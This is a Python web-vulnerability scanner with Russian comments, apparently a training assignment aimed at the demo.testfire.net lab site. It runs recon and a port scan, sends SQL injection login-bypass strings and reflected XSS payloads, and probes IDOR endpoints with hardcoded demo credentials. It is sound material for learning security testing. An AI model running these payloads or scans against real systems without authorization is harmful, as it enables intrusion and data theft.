#!/usr/bin/env python3
"""
Полная рабочая версия скрипта для тестирования безопасности.
Все ошибки исправлены.
"""

import requests
from bs4 import BeautifulSoup
import argparse
import time
import sys
import json
import socket
import re
from urllib.parse import urljoin, urlparse
from datetime import datetime
import logging

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Цвета для вывода
class Colors:
    HEADER = '\033[95m'
    INFO = '\033[94m'
    SUCCESS = '\033[92m'
    WARNING = '\033[93m'
    ERROR = '\033[91m'
    VULN = '\033[91m'
    END = '\033[0m'


class SecurityTester:
    """
    Класс для тестирования безопасности веб-приложений.
    """
    
    def __init__(self, target_url, verbose=True):
        """
        Инициализация тестера.
        """
        self.base_url = target_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.start_time = datetime.now()
        self.vulnerabilities = []
        self.test_results = {
            'sqli': [],
            'xss': [],
            'idor': [],
            'csrf': [],
            'information': []
        }
    
    def log(self, message, level="INFO"):
        """Вывод сообщений с цветами."""
        if not self.verbose and level == "INFO":
            return
        
        color_map = {
            "INFO": Colors.INFO,
            "SUCCESS": Colors.SUCCESS,
            "WARNING": Colors.WARNING,
            "ERROR": Colors.ERROR,
            "VULN": Colors.VULN
        }
        color = color_map.get(level, Colors.END)
        print(f"{color}[{level}] {message}{Colors.END}")
        
        # Логирование в файл (используем стандартные уровни logging)
        log_level = {
            "INFO": logging.INFO,
            "SUCCESS": logging.INFO,
            "WARNING": logging.WARNING,
            "ERROR": logging.ERROR,
            "VULN": logging.WARNING
        }.get(level, logging.INFO)
        logger.log(log_level, message)
    
    def add_vulnerability(self, name, severity, details, proof=""):
        """Добавление найденной уязвимости."""
        vuln = {
            'name': name,
            'severity': severity,
            'details': details,
            'proof': proof,
            'timestamp': datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        
        severity_colors = {
            'CRITICAL': Colors.VULN,
            'HIGH': Colors.WARNING,
            'MEDIUM': Colors.WARNING,
            'LOW': Colors.INFO,
            'INFO': Colors.INFO
        }
        print(f"{severity_colors.get(severity, Colors.END)}[{severity}] УЯЗВИМОСТЬ: {name}{Colors.END}")
    
    # ==================== ЗАДАНИЕ 1: СБОР ИНФОРМАЦИИ ====================
    
    def check_robots_txt(self):
        """Проверка robots.txt."""
        self.log("Проверка robots.txt...", "INFO")
        url = urljoin(self.base_url, "/robots.txt")
        
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                content = response.text
                self.log(f"robots.txt найден!", "WARNING")
                self.test_results['information'].append({
                    'type': 'robots.txt',
                    'url': url,
                    'content': content[:500]
                })
                
                # Поиск запрещенных путей
                disallowed = []
                for line in content.split('\n'):
                    if 'Disallow:' in line:
                        path = line.replace('Disallow:', '').strip()
                        disallowed.append(path)
                        if 'admin' in path.lower() or 'private' in path.lower():
                            self.add_vulnerability(
                                "Информационная утечка через robots.txt",
                                "INFO",
                                f"Найден запрещенный путь: {path}"
                            )
                
                if disallowed:
                    self.log(f"Запрещенные пути: {disallowed}", "WARNING")
                return True
            else:
                self.log("robots.txt не найден", "INFO")
                return False
        except Exception as e:
            self.log(f"Ошибка: {e}", "ERROR")
            return False
    
    def check_sitemap(self):
        """Проверка sitemap.xml."""
        self.log("Проверка sitemap.xml...", "INFO")
        url = urljoin(self.base_url, "/sitemap.xml")
        
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                self.log(f"sitemap.xml найден!", "WARNING")
                self.test_results['information'].append({
                    'type': 'sitemap.xml',
                    'url': url,
                    'content': response.text[:500]
                })
                return True
        except:
            pass
        return False
    
    def check_security_headers(self):
        """Проверка заголовков безопасности."""
        self.log("Проверка заголовков безопасности...", "INFO")
        
        security_headers = {
            'Strict-Transport-Security': 'HSTS',
            'Content-Security-Policy': 'CSP',
            'X-Frame-Options': 'Clickjacking защита',
            'X-Content-Type-Options': 'MIME sniffing защита',
            'X-XSS-Protection': 'XSS защита',
            'Referrer-Policy': 'Referrer политика',
        }
        
        try:
            response = self.session.get(self.base_url, timeout=5)
            missing_headers = []
            
            for header, name in security_headers.items():
                if header not in response.headers:
                    missing_headers.append(name)
                    self.log(f"Отсутствует заголовок: {name}", "WARNING")
                else:
                    self.log(f"Присутствует заголовок: {name}", "SUCCESS")
            
            if missing_headers:
                self.add_vulnerability(
                    "Отсутствуют заголовки безопасности",
                    "MEDIUM",
                    f"Отсутствуют: {', '.join(missing_headers)}"
                )
        except Exception as e:
            self.log(f"Ошибка: {e}", "ERROR")
    
    def detect_technologies(self):
        """Обнаружение технологий."""
        self.log("Обнаружение технологий...", "INFO")
        
        tech_signatures = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Django': ['csrftoken', 'django'],
            'PHP': ['.php', 'PHPSESSID'],
            'ASP.NET': ['ASP.NET', 'ViewState'],
            'jQuery': ['jquery'],
            'Bootstrap': ['bootstrap'],
            'React': ['react', '_reactRootContainer'],
        }
        
        try:
            response = self.session.get(self.base_url, timeout=5)
            headers_str = str(response.headers).lower()
            body_str = response.text.lower()
            
            detected = []
            for tech, signatures in tech_signatures.items():
                for sig in signatures:
                    if sig.lower() in headers_str or sig.lower() in body_str:
                        detected.append(tech)
                        break
            
            if detected:
                unique_techs = list(set(detected))
                self.log(f"Обнаруженные технологии: {', '.join(unique_techs)}", "SUCCESS")
                self.test_results['information'].append({
                    'type': 'technologies',
                    'technologies': unique_techs
                })
        except Exception as e:
            self.log(f"Ошибка: {e}", "ERROR")
    
    def check_open_ports(self):
        """Проверка открытых портов."""
        self.log("Проверка открытых портов...", "INFO")
        
        parsed = urlparse(self.base_url)
        hostname = parsed.hostname
        
        if not hostname:
            self.log("Не удалось определить хост", "ERROR")
            return
        
        common_ports = {
            21: 'FTP',
            22: 'SSH',
            80: 'HTTP',
            443: 'HTTPS',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            27017: 'MongoDB',
            6379: 'Redis',
            8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt'
        }
        
        open_ports = []
        for port, service in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    open_ports.append(f"{port} ({service})")
                    self.log(f"Открыт порт: {port} ({service})", "WARNING")
                sock.close()
            except:
                pass
        
        if open_ports:
            self.add_vulnerability(
                "Открытые сетевые порты",
                "INFO",
                f"Найдены открытые порты: {', '.join(open_ports)}"
            )
    
    # ==================== ЗАДАНИЕ 2: SQL INJECTION ====================
    
    def test_sql_injection(self):
        """Тестирование SQL-инъекций."""
        self.log("="*60, "INFO")
        self.log("ТЕСТИРОВАНИЕ SQL INJECTION", "INFO")
        self.log("="*60, "INFO")
        
        sqli_payloads = [
            ("admin' or '1'='1", "admin' or '1'='1"),
            ("' or 1=1 --", "anything"),
            ("admin' --", "anything"),
            ("' or 1=1 #", "anything"),
        ]
        
        url = urljoin(self.base_url, "/login.jsp")
        vulnerabilities_found = []
        
        for username, password in sqli_payloads:
            try:
                self.log(f"Тестирование: {username[:30]}...", "INFO")
                data = {'uid': username, 'passw': password}
                
                start_time = time.time()
                response = self.session.post(url, data=data, timeout=10)
                elapsed_time = time.time() - start_time
                
                # Проверка на успешный обход
                if response.status_code == 302 or "logout" in response.text.lower():
                    self.log(f"SQL Injection УСПЕШЕН!", "VULN")
                    self.add_vulnerability(
                        "SQL Injection - обход аутентификации",
                        "CRITICAL",
                        f"Обход с пейлоадом: {username} / {password}"
                    )
                    vulnerabilities_found.append({
                        'payload': username,
                        'success': True
                    })
                    self.test_results['sqli'] = vulnerabilities_found
                    return True
                
                # Проверка на SQL-ошибки
                sql_errors = ["sql", "mysql", "syntax error", "unclosed quotation"]
                for error in sql_errors:
                    if error in response.text.lower():
                        self.log(f"Обнаружена SQL-ошибка: {error}", "WARNING")
                        self.add_vulnerability(
                            "SQL Injection - информационная утечка",
                            "HIGH",
                            f"SQL-ошибка при пейлоаде: {username}"
                        )
                        vulnerabilities_found.append({
                            'payload': username,
                            'error': error,
                            'success': False
                        })
                        break
                
                # Time-based проверка
                if elapsed_time > 4:
                    self.log(f"Обнаружена задержка: {elapsed_time:.2f} сек", "WARNING")
                    self.add_vulnerability(
                        "SQL Injection - time-based",
                        "HIGH",
                        f"Time-based инъекция с задержкой {elapsed_time:.2f} сек"
                    )
                    
            except requests.exceptions.Timeout:
                self.log("Таймаут запроса - возможна time-based инъекция", "WARNING")
            except Exception as e:
                self.log(f"Ошибка: {e}", "ERROR")
        
        self.test_results['sqli'] = vulnerabilities_found
        
        if not vulnerabilities_found:
            self.log("SQL Injection уязвимостей не обнаружено", "SUCCESS")
        
        return False
    
    # ==================== ЗАДАНИЕ 3: XSS ====================
    
    def test_xss(self):
        """Тестирование XSS."""
        self.log("="*60, "INFO")
        self.log("ТЕСТИРОВАНИЕ XSS", "INFO")
        self.log("="*60, "INFO")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
        ]
        
        search_params = ['search', 'q', 'query', 's']
        url = self.base_url
        vulnerabilities_found = []
        
        for payload in xss_payloads:
            for param in search_params:
                try:
                    self.log(f"Тестирование XSS: {param}={payload[:30]}...", "INFO")
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=5)
                    
                    if payload in response.text:
                        self.log(f"Пейлоад отражен в ответе!", "WARNING")
                        self.add_vulnerability(
                            "XSS - возможная отраженная XSS",
                            "MEDIUM",
                            f"Пейлоад отражен в ответе через параметр {param}"
                        )
                        vulnerabilities_found.append({
                            'payload': payload,
                            'param': param,
                            'reflected': True
                        })
                        
                except Exception as e:
                    self.log(f"Ошибка: {e}", "ERROR")
        
        self.test_results['xss'] = vulnerabilities_found
        
        if vulnerabilities_found:
            self.log(f"Найдено XSS уязвимостей: {len(vulnerabilities_found)}", "VULN")
        else:
            self.log("XSS уязвимостей не обнаружено", "SUCCESS")
        
        return vulnerabilities_found
    
    # ==================== ЗАДАНИЕ 4: CSRF ====================
    
    def test_csrf(self):
        """Тестирование CSRF."""
        self.log("="*60, "INFO")
        self.log("ТЕСТИРОВАНИЕ CSRF", "INFO")
        self.log("="*60, "INFO")
        
        csrf_tokens = ['csrf', 'csrf_token', 'authenticity_token', '_token', 'xsrf']
        vulnerabilities = []
        
        try:
            response = self.session.get(self.base_url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                method = form.get('method', 'get').lower()
                if method == 'post':
                    has_csrf = False
                    for token in csrf_tokens:
                        if form.find('input', {'name': token}):
                            has_csrf = True
                            self.log(f"Найден CSRF токен: {token}", "SUCCESS")
                            break
                    
                    if not has_csrf:
                        action = form.get('action', '')
                        self.log(f"Форма без CSRF токена: {action}", "WARNING")
                        vulnerabilities.append({'form_action': action})
            
            if vulnerabilities:
                self.add_vulnerability(
                    "Отсутствует CSRF защита",
                    "MEDIUM",
                    f"Найдено {len(vulnerabilities)} форм без CSRF токенов"
                )
                self.test_results['csrf'] = vulnerabilities
            else:
                self.log("CSRF защита присутствует", "SUCCESS")
                
        except Exception as e:
            self.log(f"Ошибка: {e}", "ERROR")
        
        return vulnerabilities
    
    # ==================== ЗАДАНИЕ 5: IDOR ====================
    
    def test_idor(self):
        """Тестирование IDOR."""
        self.log("="*60, "INFO")
        self.log("ТЕСТИРОВАНИЕ IDOR", "INFO")
        self.log("="*60, "INFO")
        
        test_ids = list(range(1, 21)) + [800001, 800002, 800003]
        
        idor_patterns = [
            "/showAccount?listAccounts={ID}",
            "/account.jsp?id={ID}",
            "/profile/{ID}",
            "/user/{ID}",
        ]
        
        vulnerabilities = []
        
        for pattern in idor_patterns:
            for test_id in test_ids:
                url = urljoin(self.base_url, pattern.replace("{ID}", str(test_id)))
                try:
                    response = self.session.get(url, timeout=5)
                    
                    if response.status_code == 200:
                        # Проверка, что это не страница ошибки
                        is_error = any([
                            "login" in response.text.lower(),
                            "access denied" in response.text.lower(),
                            "not found" in response.text.lower(),
                            "404" in response.text
                        ])
                        
                        if not is_error and len(response.text) > 500:
                            self.log(f"Потенциальный IDOR: {url}", "WARNING")
                            vulnerabilities.append({
                                'url': url,
                                'id': test_id,
                                'pattern': pattern
                            })
                except Exception as e:
                    pass
        
        if vulnerabilities:
            self.add_vulnerability(
                "IDOR - Insecure Direct Object Reference",
                "HIGH",
                f"Найдено {len(vulnerabilities)} потенциальных IDOR уязвимостей"
            )
            self.test_results['idor'] = vulnerabilities
            self.log(f"Найдено IDOR уязвимостей: {len(vulnerabilities)}", "VULN")
        else:
            self.log("IDOR уязвимостей не обнаружено", "SUCCESS")
        
        return vulnerabilities
    
    # ==================== АВТОРИЗАЦИЯ ====================
    
    def login(self):
        """Авторизация на сайте."""
        self.log("Попытка авторизации...", "INFO")
        url = urljoin(self.base_url, "/login.jsp")
        
        data = {'uid': 'jsmith', 'passw': 'demo1234'}
        try:
            response = self.session.post(url, data=data, allow_redirects=True, timeout=5)
            
            if "logout" in response.text.lower() or response.status_code == 302:
                self.log("Авторизация успешна!", "SUCCESS")
                return True
            else:
                self.log("Авторизация не удалась", "WARNING")
                return False
        except Exception as e:
            self.log(f"Ошибка: {e}", "ERROR")
            return False
    
    # ==================== ГЕНЕРАЦИЯ ОТЧЕТОВ ====================
    
    def generate_json_report(self):
        """Генерация JSON отчета."""
        report = {
            'target': self.base_url,
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.now().isoformat(),
            'duration': str(datetime.now() - self.start_time),
            'vulnerabilities': self.vulnerabilities,
            'test_results': self.test_results
        }
        
        with open("security_report.json", "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.log("JSON отчет сохранен: security_report.json", "SUCCESS")
    
    def generate_html_report(self):
        """Генерация HTML отчета."""
        severity_counts = {}
        for vuln in self.vulnerabilities:
            severity_counts[vuln['severity']] = severity_counts.get(vuln['severity'], 0) + 1
        
        html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Отчет по тестированию безопасности</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ font-size: 28px; margin-bottom: 10px; }}
        .content {{ padding: 30px; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }}
        .summary-card {{ background: #f8f9fa; border-radius: 15px; padding: 20px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
        .summary-card h3 {{ color: #666; font-size: 14px; margin-bottom: 10px; }}
        .summary-card .number {{ font-size: 36px; font-weight: bold; color: #333; }}
        .vuln {{ margin: 10px 0; padding: 10px; border-left: 4px solid; border-radius: 8px; }}
        .CRITICAL {{ border-color: #dc3545; background: #fff5f5; }}
        .HIGH {{ border-color: #fd7e14; background: #fff8f0; }}
        .MEDIUM {{ border-color: #ffc107; background: #fffcf0; }}
        .LOW {{ border-color: #28a745; background: #f0fff4; }}
        .INFO {{ border-color: #17a2b8; background: #f0f9ff; }}
        table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 12px; text-align: left; }}
        th {{ background: #667eea; color: white; }}
        .status-ok {{ color: #28a745; font-weight: bold; }}
        .status-vuln {{ color: #dc3545; font-weight: bold; }}
        .footer {{ background: #f8f9fa; padding: 20px; text-align: center; color: #666; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Отчет по тестированию безопасности</h1>
            <p>Автоматизированное сканирование уязвимостей</p>
        </div>
        <div class="content">
            <div style="margin-bottom: 20px;">
                <p><strong>🎯 Целевой ресурс:</strong> {self.base_url}</p>
                <p><strong>📅 Дата тестирования:</strong> {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
                <p><strong>⏱️ Длительность:</strong> {datetime.now() - self.start_time}</p>
            </div>
            
            <div class="summary">
                <div class="summary-card">
                    <h3>Всего уязвимостей</h3>
                    <div class="number">{len(self.vulnerabilities)}</div>
                </div>
            </div>
            
            <h2>🔴 Найденные уязвимости</h2>
            {''.join(f'''
            <div class="vuln {vuln['severity']}">
                <strong>{vuln['name']}</strong> [{vuln['severity']}]<br>
                {vuln['details']}<br>
                <small><i>{vuln['timestamp']}</i></small>
            </div>
            ''' for vuln in self.vulnerabilities) or '<p>✅ Уязвимостей не обнаружено</p>'}
            
            <h2>📊 Результаты тестирования</h2>
            <table>
                <thead>
                    <tr><th>Тип теста</th><th>Результат</th></tr>
                </thead>
                <tbody>
                    <tr><td>SQL Injection</td><td class="{'status-vuln' if self.test_results['sqli'] else 'status-ok'}">{'🔴 Найдено' if self.test_results['sqli'] else '✅ Не найдено'}</td></tr>
                    <tr><td>XSS</td><td class="{'status-vuln' if self.test_results['xss'] else 'status-ok'}">{'🔴 Найдено' if self.test_results['xss'] else '✅ Не найдено'}</td></tr>
                    <tr><td>IDOR</td><td class="{'status-vuln' if self.test_results['idor'] else 'status-ok'}">{'🔴 Найдено' if self.test_results['idor'] else '✅ Не найдено'}</td></tr>
                    <tr><td>CSRF</td><td class="{'status-vuln' if self.test_results['csrf'] else 'status-ok'}">{'🔴 Найдено' if self.test_results['csrf'] else '✅ Не найдено'}</td></tr>
                </tbody>
            </table>
        </div>
        <div class="footer">
            <p>Отчет сгенерирован автоматически. Используйте только для образовательных целей.</p>
        </div>
    </div>
</body>
</html>"""
        
        with open("security_report.html", "w", encoding="utf-8") as f:
            f.write(html)
        
        self.log("HTML отчет сохранен: security_report.html", "SUCCESS")
    
    def run(self):
        """Запуск полного цикла тестирования."""
        print("\n" + "="*70)
        print(" " * 15 + "🔒 ПОЛНОЕ ТЕСТИРОВАНИЕ БЕЗОПАСНОСТИ 🔒")
        print("="*70)
        
        # ЗАДАНИЕ 1: Сбор информации
        self.log("\n📁 ЗАДАНИЕ 1: СБОР ИНФОРМАЦИИ", "INFO")
        self.check_robots_txt()
        self.check_sitemap()
        self.check_security_headers()
        self.detect_technologies()
        self.check_open_ports()
        
        # ЗАДАНИЕ 2: SQL Injection
        self.log("\n💉 ЗАДАНИЕ 2: SQL INJECTION", "INFO")
        self.test_sql_injection()
        
        # ЗАДАНИЕ 3: XSS
        self.log("\n📝 ЗАДАНИЕ 3: XSS (CROSS-SITE SCRIPTING)", "INFO")
        self.test_xss()
        
        # ЗАДАНИЕ 4: CSRF
        self.log("\n🔑 ЗАДАНИЕ 4: CSRF ЗАЩИТА", "INFO")
        self.test_csrf()
        
        # ЗАДАНИЕ 5: IDOR
        self.log("\n🔓 ЗАДАНИЕ 5: IDOR", "INFO")
        if self.login():
            self.test_idor()
        else:
            self.log("Авторизация не удалась, IDOR тест выполняется без авторизации", "WARNING")
            self.test_idor()
        
        # Генерация отчетов
        self.log("\n📊 ГЕНЕРАЦИЯ ОТЧЕТОВ", "INFO")
        self.generate_json_report()
        self.generate_html_report()
        
        # Итоговый вывод
        print("\n" + "="*70)
        print(" " * 25 + "📊 ИТОГОВЫЙ ОТЧЕТ 📊")
        print("="*70)
        print(f"🎯 Целевой ресурс: {self.base_url}")
        print(f"📅 Дата: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"⏱️  Длительность: {datetime.now() - self.start_time}")
        print(f"\n🔴 Всего найдено уязвимостей: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\n" + "-"*70)
            print("СПИСОК УЯЗВИМОСТЕЙ:")
            print("-"*70)
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. [{vuln['severity']}] {vuln['name']}")
                print(f"   📝 {vuln['details']}")
        
        print("\n" + "="*70)
        print(" " * 20 + "✅ ТЕСТИРОВАНИЕ УСПЕШНО ЗАВЕРШЕНО ✅")
        print("="*70)
        print("\n📄 Созданные отчеты:")
        print("   • security_report.json - JSON формат")
        print("   • security_report.html - HTML формат")
        print("   • security_test.log - Лог файл")


# ==================== ГЛАВНАЯ ФУНКЦИЯ ====================

def main():
    parser = argparse.ArgumentParser(description="🔒 Полный сканер безопасности веб-приложений")
    parser.add_argument("url", help="Целевой URL (например, http://demo.testfire.net)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Детальный вывод")
    parser.add_argument("--quiet", "-q", action="store_true", help="Минимальный вывод")
    
    args = parser.parse_args()
    
    print("="*70)
    print(" " * 15 + "⚠️  ВНИМАНИЕ: ИСПОЛЬЗУЙТЕ ТОЛЬКО НА РАЗРЕШЕННЫХ ТЕСТОВЫХ СТЕНДАХ ⚠️")
    print("="*70)
    print(f"📌 Целевой ресурс: {args.url}")
    print(f"📌 Режим вывода: {'Детальный' if args.verbose else ('Минимальный' if args.quiet else 'Обычный')}")
    print("="*70)
    
    verbose = not args.quiet
    tester = SecurityTester(args.url, verbose=verbose)
    
    try:
        tester.run()
    except KeyboardInterrupt:
        print("\n\n⚠️ Тестирование прервано пользователем")
    except Exception as e:
        print(f"\n❌ Критическая ошибка: {e}")
        import traceback
        traceback.print_exc()
    
    input("\n\nНажмите Enter для выхода...")


if __name__ == "__main__":
    main()